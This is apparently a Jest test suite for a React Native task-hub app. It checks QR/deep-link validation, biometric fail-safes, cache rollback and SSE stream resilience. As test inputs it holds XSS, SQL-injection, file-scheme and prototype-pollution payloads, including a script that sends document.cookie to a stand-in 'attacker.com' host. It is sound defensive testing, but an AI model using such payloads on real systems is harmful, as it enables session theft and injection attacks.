import { QRScannerService } from '@/services/qrScanner';
import { BiometricsService } from '@/services/biometrics';
import { SecureStorageService } from '@/services/secureStorage';
import { SSEStreamClient } from '@/services/sseStreamClient';
import { TaskHubApiClient } from '@/api/client';
import { queryKeys, CACHE_STORAGE_KEY, asyncStoragePersister } from '@/api/queryClient';
import { QueryClient } from '@tanstack/react-query';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as LocalAuthentication from 'expo-local-authentication';
import {
  mockLocalAuthentication,
  mockReactNativeSSE,
  mockSecureStore,
  mockAsyncStorage,
} from '../../jest.setup';
import { Task } from '@/api/types';

describe('Tier 5: Adversarial Security & Resilience Hardening Suite', () => {
  let originalFetch: typeof global.fetch;

  beforeEach(async () => {
    originalFetch = global.fetch;
    jest.clearAllMocks();
    mockReactNativeSSE.__resetInstances();
    mockLocalAuthentication.__resetMock();
    mockSecureStore.__resetStore();
    mockAsyncStorage.__resetStore();
  });

  afterEach(async () => {
    global.fetch = originalFetch;
    jest.useRealTimers();
    mockSecureStore.__resetStore();
    mockAsyncStorage.__resetStore();
  });

  // =========================================================================
  // Dimension 1: QR Code Parser Adversarial Stress & Malicious Payloads
  // =========================================================================
  describe('Dimension 1: QR Code Parser Adversarial Stress & Malicious Payloads', () => {
    const validBasePayload = {
      type: 'taskhub_pairing',
      version: '1',
      task_hub_url: 'https://hub.example.com',
      pairing_id: 'uuid-1234-5678-90ab',
      device_secret: 'sec_abcdef1234567890abcdef1234567890',
    };

    describe('1.1 Malicious Deep Links & Scheme Injection', () => {
      it('rejects deep links without query parameters', () => {
        const result = QRScannerService.parseAndValidateQrPayload('taskhub://pair');
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toBe('Deep link missing query parameters');
        }
      });

      it('rejects deep links attempting javascript: protocol injection', () => {
        const payload = 'taskhub://pair?task_hub_url=javascript:alert(1)&pairing_id=id&device_secret=sec_1234567890abcdef';
        const result = QRScannerService.parseAndValidateQrPayload(payload);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toBe('task_hub_url must be a valid HTTP or HTTPS URL');
        }
      });

      it('rejects deep links attempting data: text/html XSS payload injection', () => {
        const payload = 'taskhub://pair?task_hub_url=data:text/html,<script>alert(1)</script>&pairing_id=id&device_secret=sec_1234567890abcdef';
        const result = QRScannerService.parseAndValidateQrPayload(payload);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toBe('task_hub_url must be a valid HTTP or HTTPS URL');
        }
      });

      it('rejects deep links attempting file:// scheme traversal', () => {
        const payload = 'taskhub://pair?task_hub_url=file:///etc/passwd&pairing_id=id&device_secret=sec_1234567890abcdef';
        const result = QRScannerService.parseAndValidateQrPayload(payload);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toBe('task_hub_url must be a valid HTTP or HTTPS URL');
        }
      });

      it('rejects deep links attempting ws:// WebSocket protocol spoofing', () => {
        const payload = 'taskhub://pair?task_hub_url=ws://evil-c2.internal&pairing_id=id&device_secret=sec_1234567890abcdef';
        const result = QRScannerService.parseAndValidateQrPayload(payload);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toBe('task_hub_url must be a valid HTTP or HTTPS URL');
        }
      });

      it('parses valid deep link with direct query parameters and normalizes URL', () => {
        const deepLink = 'taskhub://pair?task_hub_url=https://hub.example.com///&pairing_id=p-999&device_secret=sec_1234567890abcdef&code=123-456&workspace_id=7';
        const result = QRScannerService.parseAndValidateQrPayload(deepLink);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.task_hub_url).toBe('https://hub.example.com');
          expect(result.payload.pairing_id).toBe('p-999');
          expect(result.payload.device_secret).toBe('sec_1234567890abcdef');
          expect(result.payload.code).toBe('123-456');
          expect(result.payload.workspace_id).toBe(7);
        }
      });

      it('parses valid deep link with URL-encoded data JSON parameter', () => {
        const innerJson = JSON.stringify({
          ...validBasePayload,
          code: 'ENC-789',
          workspace_id: 15,
        });
        const deepLink = `taskhub://pair?data=${encodeURIComponent(innerJson)}`;
        const result = QRScannerService.parseAndValidateQrPayload(deepLink);

        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.code).toBe('ENC-789');
          expect(result.payload.workspace_id).toBe(15);
          expect(result.payload.task_hub_url).toBe('https://hub.example.com');
        }
      });
    });

    describe('1.2 Spoofed Workspace IDs & Parameter Injection', () => {
      it('safely handles non-integer or spoofed workspace IDs in deep links without crashing', () => {
        const deepLink = 'taskhub://pair?url=https://hub.example.com&id=p-1&secret=sec_1234567890abcdef&ws=non_numeric_spoofed_id';
        const result = QRScannerService.parseAndValidateQrPayload(deepLink);

        expect(result.success).toBe(true);
        if (result.success) {
          // NaN or non-number is filtered to undefined
          expect(result.payload.workspace_id).toBeUndefined();
        }
      });

      it('safely handles string-typed workspace_id in JSON payload without type corruption', () => {
        const payload = {
          ...validBasePayload,
          workspace_id: 'spoofed_string_id',
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(payload));
        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.workspace_id).toBeUndefined();
        }
      });

      it('safely sanitizes SQL injection payloads in pairing_id and code fields', () => {
        const sqlInjection = {
          ...validBasePayload,
          pairing_id: "uuid-123' OR '1'='1' --",
          code: "'; DROP TABLE users; --",
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(sqlInjection));
        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.pairing_id).toBe("uuid-123' OR '1'='1' --");
          expect(result.payload.code).toBe("'; DROP TABLE users; --");
        }
      });

      it('safely handles XSS script payloads in pairing metadata without script execution', () => {
        const xssPayload = {
          ...validBasePayload,
          pairing_id: '<script>window.location="http://attacker.com/steal?c="+document.cookie</script>',
          code: '<img src=x onerror=alert(1)>',
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(xssPayload));
        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.pairing_id).toContain('<script>');
          expect(result.payload.code).toContain('<img src=x');
        }
      });
    });

    describe('1.3 Secret Length & Entropy Boundary Verification', () => {
      it('rejects device secret with exactly 15 characters (under 16 boundary)', () => {
        const payload = {
          ...validBasePayload,
          device_secret: '123456789012345', // 15 chars
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(payload));
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toContain('must be at least 16 characters');
        }
      });

      it('accepts device secret with exactly 16 characters (boundary minimum)', () => {
        const payload = {
          ...validBasePayload,
          device_secret: '1234567890123456', // 16 chars
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(payload));
        expect(result.success).toBe(true);
      });

      it('rejects device secret composed only of whitespace', () => {
        const payload = {
          ...validBasePayload,
          device_secret: '                ', // 16 spaces
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(payload));
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toContain('Missing or insecure device_secret');
        }
      });

      it('rejects web approval URL with secret under 16 characters', () => {
        const approvalUrl = 'https://hub.example.com/desktop/pairing/pair-123/approve?code=999&secret=short_sec';
        const result = QRScannerService.parseAndValidateQrPayload(approvalUrl);
        expect(result.success).toBe(false);
        if (!result.success) {
          expect(result.error).toContain('minimum 16 characters');
        }
      });

      it('parses valid web approval URL with 16+ character secret', () => {
        const approvalUrl = 'https://hub.example.com/desktop/pairing/pair-123/approve?code=999&secret=valid_secret_1234567890';
        const result = QRScannerService.parseAndValidateQrPayload(approvalUrl);
        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.task_hub_url).toBe('https://hub.example.com');
          expect(result.payload.pairing_id).toBe('pair-123');
          expect(result.payload.device_secret).toBe('valid_secret_1234567890');
          expect(result.payload.code).toBe('999');
        }
      });
    });

    describe('1.4 Hostile JSON & Prototype Tampering', () => {
      it('prevents prototype pollution from malicious JSON payloads', () => {
        const maliciousJson = JSON.stringify({
          type: 'taskhub_pairing',
          version: '1',
          task_hub_url: 'https://hub.example.com',
          pairing_id: 'pair-1',
          device_secret: 'sec_1234567890abcdef',
          __proto__: { isAdmin: true },
        });

        const result = QRScannerService.parseAndValidateQrPayload(maliciousJson);
        expect(result.success).toBe(true);
        expect((Object.prototype as any).isAdmin).toBeUndefined();
      });

      it('safely rejects non-object primitive JSON (arrays, numbers, booleans)', () => {
        expect(QRScannerService.parseAndValidateQrPayload('12345')).toEqual({
          success: false,
          error: 'QR payload must be a JSON object',
        });
        expect(QRScannerService.parseAndValidateQrPayload('"just a string"')).toEqual({
          success: false,
          error: 'QR payload must be a JSON object',
        });
        expect(QRScannerService.parseAndValidateQrPayload('true')).toEqual({
          success: false,
          error: 'QR payload must be a JSON object',
        });
      });

      it('handles massive payload without buffer crash', () => {
        const massivePayload = {
          ...validBasePayload,
          code: 'A'.repeat(50000), // 50KB code payload
        };
        const result = QRScannerService.parseAndValidateQrPayload(JSON.stringify(massivePayload));
        expect(result.success).toBe(true);
        if (result.success) {
          expect(result.payload.code?.length).toBe(50000);
        }
      });
    });
  });

  // =========================================================================
  // Dimension 2: Biometrics Fail-Safe & Hardware Lockout Defenses
  // =========================================================================
  describe('Dimension 2: Biometrics Fail-Safe & Hardware Lockout Defenses', () => {
    it('strictly halts sensitive action when biometric authentication fails with unauthorized error', async () => {
      mockLocalAuthentication.__setMockResult({ success: false, error: 'NOT_AUTHENTICATED' });

      const sensitiveAction = jest.fn(async () => 'CRITICAL_OPERATION_EXECUTED');

      await expect(
        BiometricsService.guardSensitiveAction(sensitiveAction, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: NOT_AUTHENTICATED');

      // Crucial security invariant: the sensitive callback MUST NOT have been called
      expect(sensitiveAction).not.toHaveBeenCalled();
    });

    it('strictly halts sensitive action when user cancels the biometric prompt', async () => {
      mockLocalAuthentication.__setMockResult({ success: false, error: 'USER_CANCELLED' });

      const sensitiveAction = jest.fn(async () => 'CRITICAL_OPERATION_EXECUTED');

      await expect(
        BiometricsService.guardSensitiveAction(sensitiveAction, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: USER_CANCELLED');

      expect(sensitiveAction).not.toHaveBeenCalled();
    });

    it('strictly halts sensitive action when biometric hardware is unavailable', async () => {
      mockLocalAuthentication.__setHardwareAvailable(false);

      const sensitiveAction = jest.fn(async () => 'CRITICAL_OPERATION_EXECUTED');

      await expect(
        BiometricsService.guardSensitiveAction(sensitiveAction, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: BIOMETRIC_HARDWARE_UNAVAILABLE');

      expect(sensitiveAction).not.toHaveBeenCalled();
    });

    it('strictly halts sensitive action when device is not enrolled in biometrics', async () => {
      mockLocalAuthentication.__setHardwareAvailable(true);
      mockLocalAuthentication.__setEnrolled(false);

      const sensitiveAction = jest.fn(async () => 'CRITICAL_OPERATION_EXECUTED');

      await expect(
        BiometricsService.guardSensitiveAction(sensitiveAction, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: BIOMETRIC_NOT_ENROLLED');

      expect(sensitiveAction).not.toHaveBeenCalled();
    });

    it('strictly halts sensitive action under permanent or temporary biometric lockouts', async () => {
      // 1. Temporary lockout
      mockLocalAuthentication.__setMockResult({ success: false, error: 'LOCKOUT_TEMPORARY' });
      const action1 = jest.fn(async () => 'OP');
      await expect(
        BiometricsService.guardSensitiveAction(action1, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: LOCKOUT_TEMPORARY');
      expect(action1).not.toHaveBeenCalled();

      // 2. Permanent lockout
      mockLocalAuthentication.__setMockResult({ success: false, error: 'LOCKOUT_PERMANENT' });
      const action2 = jest.fn(async () => 'OP');
      await expect(
        BiometricsService.guardSensitiveAction(action2, 'Authorize Handoff')
      ).rejects.toThrow('Biometric verification failed: LOCKOUT_PERMANENT');
      expect(action2).not.toHaveBeenCalled();
    });

    it('gracefully handles native module exceptions during authentication without crashing', async () => {
      mockLocalAuthentication.authenticateAsync.mockRejectedValueOnce(
        new Error('Native authentication daemon IPC crashed')
      );

      const result = await BiometricsService.authenticate('Crash test');
      expect(result.success).toBe(false);
      expect(result.error).toBe('Native authentication daemon IPC crashed');
    });

    it('safely handles native module exceptions during hardware discovery', async () => {
      mockLocalAuthentication.hasHardwareAsync.mockRejectedValueOnce(
        new Error('HAL driver fault')
      );

      const available = await BiometricsService.isHardwareAvailable();
      expect(available).toBe(false);
    });

    it('safely handles native module exceptions during enrollment discovery', async () => {
      mockLocalAuthentication.isEnrolledAsync.mockRejectedValueOnce(
        new Error('Keystore access fault')
      );

      const enrolled = await BiometricsService.isEnrolled();
      expect(enrolled).toBe(false);
    });

    it('correctly maps multi-factor biometric types with fallback to None on error', async () => {
      // FaceID
      mockLocalAuthentication.__setSupportedTypes([
        LocalAuthentication.AuthenticationType.FACIAL_RECOGNITION,
      ]);
      expect(await BiometricsService.getBiometryName()).toBe('FaceID');

      // TouchID
      mockLocalAuthentication.__setSupportedTypes([
        LocalAuthentication.AuthenticationType.FINGERPRINT,
      ]);
      expect(await BiometricsService.getBiometryName()).toBe('TouchID');

      // Iris
      mockLocalAuthentication.__setSupportedTypes([
        LocalAuthentication.AuthenticationType.IRIS,
      ]);
      expect(await BiometricsService.getBiometryName()).toBe('Iris');

      // None
      mockLocalAuthentication.__setSupportedTypes([]);
      expect(await BiometricsService.getBiometryName()).toBe('None');

      // Exception fallback
      mockLocalAuthentication.supportedAuthenticationTypesAsync.mockRejectedValueOnce(
        new Error('Type error')
      );
      expect(await BiometricsService.getBiometryName()).toBe('None');
    });

    it('allows sensitive action to succeed when biometrics pass', async () => {
      mockLocalAuthentication.__setMockResult({ success: true });

      const sensitiveAction = jest.fn(async () => ({ approved: true, timestamp: Date.now() }));
      const result = await BiometricsService.guardSensitiveAction(sensitiveAction, 'Approve');

      expect(sensitiveAction).toHaveBeenCalledTimes(1);
      expect(result.approved).toBe(true);
    });
  });

  // =========================================================================
  // Dimension 3: TanStack Query Offline Persistence & Cache Resilience
  // =========================================================================
  describe('Dimension 3: TanStack Query Offline Persistence & Cache Resilience', () => {
    let testQueryClient: QueryClient;

    beforeEach(() => {
      testQueryClient = new QueryClient({
        defaultOptions: {
          queries: { retry: false },
          mutations: { retry: 0 },
        },
      });
    });

    afterEach(() => {
      testQueryClient.clear();
    });

    it('detects and rejects corrupted invalid JSON in AsyncStorage cache storage', async () => {
      // Corrupt the offline storage key
      await AsyncStorage.setItem(
        CACHE_STORAGE_KEY,
        '<<<CORRUPTED INVALID JSON PAYLOAD! @#$%^&>>>'
      );

      // Attempt reading directly via persister interface: must reject safely with JSON parse error
      await expect(asyncStoragePersister.restoreClient()).rejects.toThrow();
    });

    it('handles unexpected non-client data types in AsyncStorage without crashing', async () => {
      await AsyncStorage.setItem(CACHE_STORAGE_KEY, JSON.stringify([1, 2, 3]));
      const restoredArr = await asyncStoragePersister.restoreClient();
      expect(restoredArr).toEqual([1, 2, 3]);

      await AsyncStorage.setItem(CACHE_STORAGE_KEY, JSON.stringify('plain string'));
      const restoredStr = await asyncStoragePersister.restoreClient();
      expect(restoredStr).toBe('plain string');
    });

    it('persists and restores valid client state to AsyncStorage', async () => {
      const mockPersistedState = {
        timestamp: Date.now(),
        buster: 'v1',
        clientState: {
          mutationState: { mutations: [] },
          queries: [
            {
              state: {
                data: [{ id: 101, title: 'Cached Task', status: 'in_progress' }],
                status: 'success',
              },
              queryKey: ['tasks', 'list', { project_id: 1 }],
              queryHash: '["tasks","list",{"project_id":1}]',
            },
          ],
        },
      };

      await asyncStoragePersister.persistClient(mockPersistedState as any);

      const raw = await AsyncStorage.getItem(CACHE_STORAGE_KEY);
      expect(raw).toBeDefined();
      expect(raw).toContain('Cached Task');

      const restored = await asyncStoragePersister.restoreClient();
      expect(restored).toEqual(mockPersistedState);
    });

    it('performs optimistic task status update with automatic rollback on HTTP 500 server error', async () => {
      const initialTasks: Task[] = [
        {
          id: 101,
          workspace_id: 1,
          project_id: 1,
          title: 'Critical Task',
          status: 'todo',
          issue_type: 'task',
          priority: 'urgent',
          created_at: '2026-08-25T00:00:00Z',
          updated_at: '2026-08-25T00:00:00Z',
        },
      ];

      // Seed query cache
      testQueryClient.setQueryData(queryKeys.tasks.all, initialTasks);
      testQueryClient.setQueryData(queryKeys.tasks.detail(101), initialTasks[0]);

      // Simulate the onMutate optimistic update
      const previousTasks = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);
      const previousDetail = testQueryClient.getQueryData<Task>(queryKeys.tasks.detail(101));

      testQueryClient.setQueryData<Task[]>(queryKeys.tasks.all, (old) => {
        return (old || []).map((t) => (t.id === 101 ? { ...t, status: 'in_progress' } : t));
      });
      testQueryClient.setQueryData<Task>(queryKeys.tasks.detail(101), (old) => {
        return old ? { ...old, status: 'in_progress' } : old;
      });

      // Verify optimistic update is visible in cache
      const optimisticState = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);
      expect(optimisticState?.[0]?.status).toBe('in_progress');

      // Simulate Server 500 Failure
      const server500Error = new Error('HTTP 500: Database lock timeout');
      (server500Error as any).status = 500;

      // Simulate onError rollback logic
      testQueryClient.setQueryData(queryKeys.tasks.all, previousTasks);
      testQueryClient.setQueryData(queryKeys.tasks.detail(101), previousDetail);

      // Verify rollback restored previous state
      const rolledBackTasks = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);
      const rolledBackDetail = testQueryClient.getQueryData<Task>(queryKeys.tasks.detail(101));

      expect(rolledBackTasks?.[0]?.status).toBe('todo');
      expect(rolledBackDetail?.status).toBe('todo');
    });

    it('performs optimistic task creation rollback on HTTP 500 server error', async () => {
      const initialTasks: Task[] = [
        {
          id: 1,
          workspace_id: 1,
          project_id: 1,
          title: 'Existing Task 1',
          status: 'todo',
          issue_type: 'task',
          priority: 'medium',
          created_at: '2026-08-25T00:00:00Z',
          updated_at: '2026-08-25T00:00:00Z',
        },
      ];

      testQueryClient.setQueryData(queryKeys.tasks.all, initialTasks);
      const previousTasks = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);

      // Optimistic addition
      const tempTask: Task = {
        id: -12345,
        workspace_id: 1,
        project_id: 1,
        title: 'New Pending Task',
        status: 'todo',
        issue_type: 'task',
        priority: 'high',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      };

      testQueryClient.setQueryData<Task[]>(queryKeys.tasks.all, (old) => [tempTask, ...(old || [])]);
      expect(testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all)?.length).toBe(2);

      // Simulate Server Failure -> Rollback
      testQueryClient.setQueryData(queryKeys.tasks.all, previousTasks);

      const finalTasks = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);
      expect(finalTasks?.length).toBe(1);
      expect(finalTasks?.[0]?.id).toBe(1);
    });

    it('performs optimistic task deletion rollback on HTTP 500 server error', async () => {
      const initialTasks: Task[] = [
        {
          id: 77,
          workspace_id: 1,
          project_id: 1,
          title: 'Task To Delete',
          status: 'todo',
          issue_type: 'task',
          priority: 'low',
          created_at: '2026-08-25T00:00:00Z',
          updated_at: '2026-08-25T00:00:00Z',
        },
      ];

      testQueryClient.setQueryData(queryKeys.tasks.all, initialTasks);
      testQueryClient.setQueryData(queryKeys.tasks.detail(77), initialTasks[0]);
      const previousTasks = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);

      // Optimistic delete
      testQueryClient.setQueryData<Task[]>(queryKeys.tasks.all, (old) =>
        (old || []).filter((t) => t.id !== 77)
      );
      testQueryClient.removeQueries({ queryKey: queryKeys.tasks.detail(77) });

      expect(testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all)?.length).toBe(0);

      // Simulate Server 500 Failure -> Rollback
      testQueryClient.setQueryData(queryKeys.tasks.all, previousTasks);
      testQueryClient.setQueryData(queryKeys.tasks.detail(77), previousTasks?.[0]);

      const restoredList = testQueryClient.getQueryData<Task[]>(queryKeys.tasks.all);
      const restoredDetail = testQueryClient.getQueryData<Task>(queryKeys.tasks.detail(77));

      expect(restoredList?.length).toBe(1);
      expect(restoredList?.[0]?.id).toBe(77);
      expect(restoredDetail?.id).toBe(77);
    });
  });

  // =========================================================================
  // Dimension 4: SSE Connection Storm, Security Eviction & Keepalive Jitter
  // =========================================================================
  describe('Dimension 4: SSE Connection Storm, Security Eviction & Keepalive Jitter', () => {
    it('survives rapid connect/disconnect storm (25 cycles) without leaking sockets or throwing', () => {
      const client = new SSEStreamClient();
      const stormCount = 25;

      for (let i = 0; i < stormCount; i++) {
        client.connect({
          url: 'http://localhost:8000/api/v1/tasks/agent-runs/stream',
          token: `token_${i}`,
          runId: i,
        });
        client.disconnect();
      }

      expect(client.getState()).toBe('disconnected');
      // All instances created must have been closed
      const instances = mockReactNativeSSE.__getInstances();
      expect(instances.length).toBe(stormCount);
      for (const inst of instances) {
        expect(inst.readyState).toBe(2); // MockEventSource.CLOSED
      }
    });

    it('triggers automatic auth token eviction from hardware storage upon 401 Unauthorized API error', async () => {
      await SecureStorageService.saveToken('sensitive_active_auth_token_999');
      expect(await SecureStorageService.hasToken()).toBe(true);

      // Simulate server returning HTTP 401 Unauthorized
      global.fetch = jest.fn().mockResolvedValueOnce({
        ok: false,
        status: 401,
        statusText: 'Unauthorized',
        json: async () => ({ message: 'Session expired or token revoked' }),
      });

      const apiClient = new TaskHubApiClient();

      try {
        await apiClient.getWorkspaces();
        fail('Should throw 401 Unauthorized');
      } catch (err: any) {
        expect(err.status).toBe(401);
      }

      // Cryptographic hardware key eviction verified
      const remainingToken = await SecureStorageService.getToken();
      expect(remainingToken).toBeNull();
      expect(await SecureStorageService.hasToken()).toBe(false);
    });

    it('handles arbitrary keepalive jitter, comment ping frames and whitespace frames without crashing', () => {
      const receivedLogs: any[] = [];
      const receivedEvents: any[] = [];
      const client = new SSEStreamClient();

      client.connect({
        url: 'http://localhost:8000/api/v1/tasks/agent-runs/stream',
        token: 'th_token',
        onEvent: (e) => receivedEvents.push(e),
        onLog: (l) => receivedLogs.push(l),
      });

      const instance = mockReactNativeSSE.__getLastInstance();
      instance.__emitOpen();

      // Emit high-frequency jitter frames & non-JSON comments
      instance.__emitCustomEvent('agent-run', ': keepalive');
      instance.__emitCustomEvent('agent-run', ': ping timestamp=1724580000');
      instance.__emitCustomEvent('agent-run', ': \n');
      instance.__emitCustomEvent('agent-run', '   \n   ');
      instance.__emitCustomEvent('agent-run', '');
      instance.__emitCustomEvent('agent-run', 'null');
      instance.__emitCustomEvent('agent-run', 'malformed_non_json_string');

      instance.__emitCustomEvent('agent-log', ': keepalive');
      instance.__emitCustomEvent('agent-log', ': ping');
      instance.__emitCustomEvent('agent-log', 'malformed_log_chunk');

      expect(receivedEvents.length).toBe(0);
      expect(receivedLogs.length).toBe(0);

      // Follow-up valid event is processed cleanly
      const validEvent = {
        id: 50,
        run_id: 1,
        type: 'status_transition',
        status: 'running',
      };
      instance.__emitCustomEvent('agent-run', JSON.stringify(validEvent));

      expect(receivedEvents.length).toBe(1);
      expect(receivedEvents[0].id).toBe(50);
      expect(client.getLastEventId()).toBe(50);
    });

    it('verifies exponential backoff delay calculation and 15000ms max cap during persistent outage', () => {
      jest.useFakeTimers();
      const client = new SSEStreamClient();

      client.connect({
        url: 'http://localhost:8000/api/v1/tasks/agent-runs/stream',
        token: 'th_token',
      });

      // Induce 10 successive connection drop errors in persistent outage
      for (let retry = 1; retry <= 10; retry++) {
        const inst = mockReactNativeSSE.__getLastInstance();
        inst.readyState = 2; // Prevent auto-open simulation during outage
        inst.__emitError(`Drop ${retry}`);
        expect(client.getState()).toBe('reconnecting');
        expect(client.getRetryCount()).toBe(retry);

        // Theoretical delay = Math.min(1000 * Math.pow(1.5, retry), 15000)
        const expectedDelay = Math.min(1000 * Math.pow(1.5, retry), 15000);
        expect(expectedDelay <= 15000).toBe(true);

        // Advance timers by the expected delay + 1ms to trigger next reconnect attempt
        jest.advanceTimersByTime(expectedDelay + 10);
      }

      jest.useRealTimers();
    });

    it('enforces monotonic cursor tracking preventing regression on out-of-order SSE chunks', () => {
      const client = new SSEStreamClient();

      client.connect({
        url: 'http://localhost:8000/api/v1/tasks/agent-runs/stream',
        token: 'th_token',
      });

      const instance = mockReactNativeSSE.__getLastInstance();
      instance.__emitOpen();

      // Sequence with out-of-order IDs: 10, 20, 15, 30, 25, 35
      instance.__emitCustomEvent('agent-run', JSON.stringify({ id: 10, type: 'step_start' }));
      expect(client.getLastEventId()).toBe(10);

      instance.__emitCustomEvent('agent-run', JSON.stringify({ id: 20, type: 'progress' }));
      expect(client.getLastEventId()).toBe(20);

      instance.__emitCustomEvent('agent-run', JSON.stringify({ id: 15, type: 'progress' })); // Out of order!
      expect(client.getLastEventId()).toBe(20); // Must NOT regress to 15

      instance.__emitCustomEvent('agent-run', JSON.stringify({ id: 30, type: 'step_complete' }));
      expect(client.getLastEventId()).toBe(30);

      instance.__emitCustomEvent('agent-run', JSON.stringify({ id: 25, type: 'progress' })); // Out of order!
      expect(client.getLastEventId()).toBe(30); // Must NOT regress to 25

      instance.__emitCustomEvent('agent-log', JSON.stringify({ id: 100, stream: 'stdout', content: 'L1' }));
      expect(client.getLastLogId()).toBe(100);

      instance.__emitCustomEvent('agent-log', JSON.stringify({ id: 80, stream: 'stdout', content: 'L2' })); // Out of order log!
      expect(client.getLastLogId()).toBe(100); // Must NOT regress to 80
    });
  });
});
